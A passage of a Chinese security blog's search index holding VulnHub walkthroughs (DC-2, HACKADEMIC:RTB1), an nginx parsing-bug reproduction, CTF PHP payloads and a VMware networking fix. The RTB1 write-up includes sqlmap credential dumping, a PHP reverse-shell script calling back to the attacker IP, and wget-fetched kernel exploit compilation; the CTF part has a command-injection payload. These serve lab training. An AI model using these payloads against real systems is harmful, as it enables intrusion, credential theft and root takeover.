使用之前爆破到的密码切换到jerry用户</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172046660.png" alt="image">​</p></li><li><p>得到flag4</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047021.png" alt="image">​</p></li><li><p>寻找root用户拥有的文件，并将错误写入&#x2F;dev&#x2F;null</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm /4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047522.png" alt="image">​</p><p> 看到拥有sudo权限</p><p> 使用sudo -l 显示当前用户可以用 sudo 执行那些命令</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047158.png" alt="image">​</p><p> 发现可以利用sudo执行git命令</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看提权命令网站：https://gtfobins.github.io/</span><br></pre></td></tr></table></figure><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047609.png" alt="image">​</p><p> 成功提权到root</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047548.png" alt="image"></p><p> 得到最后一个flag</p><p> ​<img src="https://gitee.com/jianhao_com/picture/raw/master/202309172047641.png" alt="image">​</p></li></ol><p><strong>‍DC-2这个靶机到这里就完美结束了！</strong></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机 HACKADEMIC:RTB1</title>
      <link href="/2023/08/01/vulnhub%E9%9D%B6%E6%9C%BA/HACKADEMIC%EF%BC%9ARTB1/"/>
      <url>/2023/08/01/vulnhub%E9%9D%B6%E6%9C%BA/HACKADEMIC%EF%BC%9ARTB1/</url>
      
        <content type="html"><![CDATA[<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p>官方下载地址：<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a><br><img src="image-20230921214002318-1695303977194-1.png" alt="image-20230921214002318"><br>需要读取靶机的root目录下key.txt<br>运行环境：<br>虚拟机网络设置的是NAT模式<br>靶机：IP地址：192.168.233.131<br>攻击机：kali linux，IP地址：192.168.233.129</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>获取靶机IP地址</p><p><img src="image-20230921214008595-1695303977194-2.png" alt="image-20230921214008595"></p><p>进入靶机</p><p><img src="image-20230921214015827-1695303977194-3.png" alt="image-20230921214015827"></p><p>用wappalyzer查看用到技术</p><p><img src="image-20230921214024418-1695303977194-4.png" alt="image-20230921214024418"></p><p>查看开放的端口</p><p><img src="image-20230921214034575-1695303977194-5.png" alt="image-20230921214034575"></p><p>扫敏感目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://192.168.233.131</span><br><span class="line">dirb http://192.168.233.131/Hackademic_RTB1/</span><br><span class="line">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html -u http://192.168.233.131</span><br></pre></td></tr></table></figure><p><img src="image-20230921214043161-1695303977194-6.png" alt="image-20230921214043161"></p><p><img src="image-20230921214048356-1695303977194-7.png" alt="image-20230921214048356"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>web端寻找漏洞，php页面,f12代码注入，sql注入</p><p><img src="image-20230921214055188-1695303977194-8.png" alt="image-20230921214055188"></p><p>sqlmap注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.243.128/Hackademic_RTB1/?cat=1 --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="image-20230921214103765-1695303977194-9.png" alt="image-20230921214103765"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.233.131/Hackademic_RTB1/?cat=1 --dbms=MySQL -D wordpress --tables --batch</span><br></pre></td></tr></table></figure><p><img src="image-20230921214109583-1695303977194-10.png" alt="image-20230921214109583"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.233.131/Hackademic_RTB1/?cat=1 --dbms=MySQL -D wordpress -T wp_users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="image-20230921214119484-1695303977194-11.png" alt="image-20230921214119484"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.233.131/Hackademic_RTB1/?cat=1 --dbms=MySQL -D wordpress -T wp_users -C user_login,user_pass --dump --batch</span><br></pre></td></tr></table></figure><p><img src="image-20230921214126981-1695303977194-12.png" alt="image-20230921214126981"></p><p>GeorgeMiller、q1w2e3登录</p><p><img src="image-20230921214132354-1695303977195-13.png" alt="image-20230921214132354"></p><h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$sock = fsockopen(&#x27;192.168.233.129&#x27;,&#x27;8888&#x27;);</span><br><span class="line">$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);</span><br><span class="line">$peocess = proc_open(&#x27;/bin/sh&#x27;,$descriptorspec,$pipes);</span><br><span class="line">proc_close($process);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>上传shell</p><p><img src="image-20230921214159557-1695303977195-16.png" alt="image-20230921214159557"></p><p><img src="image-20230921214207083-1695303977195-14.png" alt="image-20230921214207083"></p><p>kali打开监听</p><p><img src="image-20230921214225849-1695303977195-15.png" alt="image-20230921214225849"></p><p>运行反弹shell</p><p><img src="image-20230921214232106-1695303977195-17.png" alt="image-20230921214232106"></p><p>反弹shell成功</p><p><img src="image-20230921214238077-1695303977195-18.png" alt="image-20230921214238077"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>找敏感信息</p><p>查权限文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm /4000 2&gt;/dev/null</span><br><span class="line">根目录     用户权限set uid   f文件类型,没有f会有目录</span><br></pre></td></tr></table></figure><p><img src="image-20230921214301461-1695303977195-19.png" alt="image-20230921214301461"></p><p>搜索内核漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 2.6.31</span><br></pre></td></tr></table></figure><p><img src="image-20230921214311793-1695303977195-20.png" alt="image-20230921214311793"></p><p>下载到本地searchsploit -m 15285.c</p><p><img src="image-20230921214321322-1695303977195-21.png" alt="image-20230921214321322"></p><p>kali开启web服务器</p><p><img src="image-20230921214328621-1695303977195-22.png" alt="image-20230921214328621"></p><p>在靶机中下载</p><p>wget <a href="http://192.168.233.129/15285.c">http://192.168.233.129/15285.c</a></p><p>wget ip地址&#x2F;文件名</p><p><img src="image-20230921214334713-1695303977195-23.png" alt="image-20230921214334713"></p><p>编译脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 15285.c -o exp</span><br></pre></td></tr></table></figure><p><img src="image-20230921214341920-1695303977195-24.png" alt="image-20230921214341920"></p><p>将编译的exp赋予执行权限并执行exp</p><p><img src="image-20230921214347976-1695303977195-25.png" alt="image-20230921214347976"></p><p>成功到root</p><p><img src="image-20230921214354971.png" alt="image-20230921214354971"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx-0.7.65 解析漏洞</title>
      <link href="/2023/07/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213590.png" alt="image-20230907231048142"></p><p>​            2.     访问抓包修改文件后缀</p><p>​可以显示phpinfo</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152216623.png" alt="image-20230915221602546"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214832.png" alt="image-20230907231341384"></p><h2 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a><strong>Nginx 解析漏洞复现</strong></h2><p>1.开启环境</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213593.png" alt="image-20230907231417121"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213591.png" alt="image-20230907231433052"></p><p>2.抓包修改文件后缀，类型以及内容头</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152217207.png" alt="image-20230907231444059"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213523.png" alt="image-20230907231454645"></p><p>上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213054.png" alt="image-20230907231514105"></p><p>使用蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214790.png" alt="image-20230907231534418"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152218679.png" alt="image-20230915221837364"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>青少年CTF-B2-PHP特性练习01-04</title>
      <link href="/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP特性01"><a href="#PHP特性01" class="headerlink" title="PHP特性01"></a>PHP特性01</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[]=admi&amp;password[]=admin</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161032137.png" alt="image">​</p><p>qsnctf{ca5f80d8-085c-4a8d-b474-a74bd1a4aada}</p><h2 id="PHP特性02"><a href="#PHP特性02" class="headerlink" title="PHP特性02"></a>PHP特性02</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031690.png" alt="image">​</p><p>qsnctf{c6c71221-f298-41ad-9da8-ca53b4a8b144}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在php中：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">num = %<span class="number">0</span>c36;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>);<span class="comment">//  ---&gt; True</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于比较运算符号：如果两个操作数都是 数字字符串，或者一个操作数是数字而另一个是 数字字符串，则比较以数字方式进行。当比较是&#x3D;&#x3D;&#x3D;或!&#x3D;&#x3D;因为这涉及比较类型和值时，不会发生类型转换 ，因此此时类型和数值都要比对</p><p>所以：**&#x3D;&#x3D;比较的是类型转换之后的数值 而 !&#x3D;&#x3D;不仅要比较数值还要比较类型**</p><p>payload构造的时候只要在1前面写一个空的字符就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br><span class="line">?value= <span class="number">1</span></span><br><span class="line">?value=%<span class="number">201</span></span><br><span class="line">?value=+<span class="number">01</span></span><br></pre></td></tr></table></figure><h2 id="PHP特性03"><a href="#PHP特性03" class="headerlink" title="PHP特性03"></a>PHP特性03</h2><p>双写绕过</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=庆历四年春，滕滕子京子京谪守巴巴陵郡陵郡。越明年，政通人和，百废俱兴，乃重修岳岳阳楼阳楼，增其旧制，刻唐贤今人诗赋于其上，属予作文以记之。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031433.png" alt="image">​</p><p>qsnctf(de64416c-6ff2-4f24-b9c8-7e32f84dda30)</p><h2 id="PHP特性04"><a href="#PHP特性04" class="headerlink" title="PHP特性04"></a>PHP特性04</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?command=<span class="title function_ invoke__">System</span>(<span class="string">&quot;cat f*&quot;</span>);&amp;key=cXNuY3Rm</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031970.png" alt="image">​</p><p><code>qsnctf&#123;803a0ef5-86e7-4d94-8f1d-3cb8332ee793&#125;</code>​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qsnctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决VMware导入vulnhub靶机无法获取IP地址</title>
      <link href="/2023/03/18/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/VMware%E6%89%93%E5%BC%80%E9%9D%B6%E6%9C%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C/"/>
      <url>/2023/03/18/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/VMware%E6%89%93%E5%BC%80%E9%9D%B6%E6%9C%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p><strong>vulnhub靶机导入之后kali扫描不到IP</strong></p><p>这种情况一般是靶机没有自动获取IP地址，网卡名称和网卡配置文件里面的名称不一致</p><h1 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h1><p>在vulnhub下载靶机，将网段调整为了NAT模式，在kali进行扫描时获取不到靶机IP</p><p><img src="202309181528279.png" alt="image-20230918152818185"></p><p><img src="202309181529724.png" alt="image-20230918152922649"></p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>关闭靶机，然后再启动靶机，启动时按shift进入如下页面</p><p><img src="202309181530745.png" alt="image-20230918153048696"></p><p>然后按e进行编辑</p><p><img src="202309181530720.png" alt="image-20230918153053667"></p><p>摁↓找到ro，将ro改为 <code>rw single init=/bin/bash</code></p><p><img src="202309181531322.png" alt="image-20230918153107277"></p><p><img src="202309181547282.png" alt="image-20230918153143415"></p><p>然后按ctrl+x，就可以输入命令了</p><p><img src="202309181533053.png" alt="image-20230918153301011"></p><p>ip a查看以下实际用的是哪一个网卡</p><p><img src="202309181533280.png" alt="image-20230918153323246"></p><p>查看网络配置文件<code>/etc/network/interfaces</code>内容，将enp0s3全部改为ens33 保存退出</p><p>新版Ubuntu网卡配置文件在 <code>/etc/netplan/XX-installer-config.yaml</code></p><p><img src="202309181533294.png" alt="image-20230918153339245"></p><p><img src="202309181533974.png" alt="image-20230918153344936"></p><p>然后重启网络即可</p><p><img src="202309181533229.png" alt="image-20230918153354172"></p><p>这样kali那边使用arp-scan进行扫描就可以获得靶机IP了</p><p><img src="202309181534496.png" alt="image-20230918153404435"></p><p><strong>最后需要重新启动靶机</strong></p><h1 id="Linux重启网卡的三种方法："><a href="#Linux重启网卡的三种方法：" class="headerlink" title="Linux重启网卡的三种方法："></a>Linux重启网卡的三种方法：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">一、network</span><br><span class="line">利用root帐户</span><br><span class="line"><span class="comment"># service network restart</span></span><br><span class="line"></span><br><span class="line">或者/etc/init.d/networking restart</span><br><span class="line"></span><br><span class="line">二、ifdown/ifup</span><br><span class="line"><span class="comment"># ifdown eth0</span></span><br><span class="line"><span class="comment"># ifup eth0</span></span><br><span class="line"></span><br><span class="line">三、ifconfig</span><br><span class="line"><span class="comment"># ifconfig eth0 down</span></span><br><span class="line"><span class="comment"># ifconfig eth0 up</span></span><br><span class="line"></span><br><span class="line">Ubuntu14.04修改配置，重启网卡没有生效，出现如下问题：</span><br><span class="line"></span><br><span class="line">service  networking restart //重启网络服务</span><br><span class="line">stop: Job failed <span class="keyword">while</span> stopping</span><br><span class="line">start: Job is already running: networking</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/upstart/networking.log //查看错误日志</span><br><span class="line">Stopping or restarting the networking job is notsupported.</span><br><span class="line">Use ifdown &amp; ifup to reconfigure desired interface.</span><br><span class="line"></span><br><span class="line">从以上日志内容可以看出，传统的service重启和停止网络已经不再支持了，需要通过使用ifdown &amp;ifup来实现相应的操作。</span><br><span class="line"></span><br><span class="line">重启指定网卡</span><br><span class="line">ifdown eth0 &amp;&amp; ifup eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 疑难杂症 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>博客自述</title>
      <link href="/2022/12/27/hello-world/"/>
      <url>/2022/12/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>由于博主很穷，兜比脸干净，所以主打的就是一个白嫖</p><p>博客是用GitHub+hexo搭建，图传用的是PicGo+Github+Gitee</p><p>hexo主题用的是安知鱼</p><p>hexo地址：<a href="https://hexo.io/zh-cn/">https://hexo.io/zh-cn/</a></p><p>安知鱼下载地址：<a href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu">anzhiyu-c&#x2F;hexo-theme-anzhiyu: 这是一个简洁美丽的hexo主题。 (github.com)</a></p><p>安知鱼使用文档：<a href="https://docs.anheyu.com/">安知鱼主题官方文档 | 一个简洁、美丽的静态hexo主题 (anheyu.com)</a></p><p><strong>由于各种白嫖，所以访问速度很慢，图片经常出现加载不出来的情况，各位大佬见谅，如遇到图片没有加载请多刷新几次页面！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客自述 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
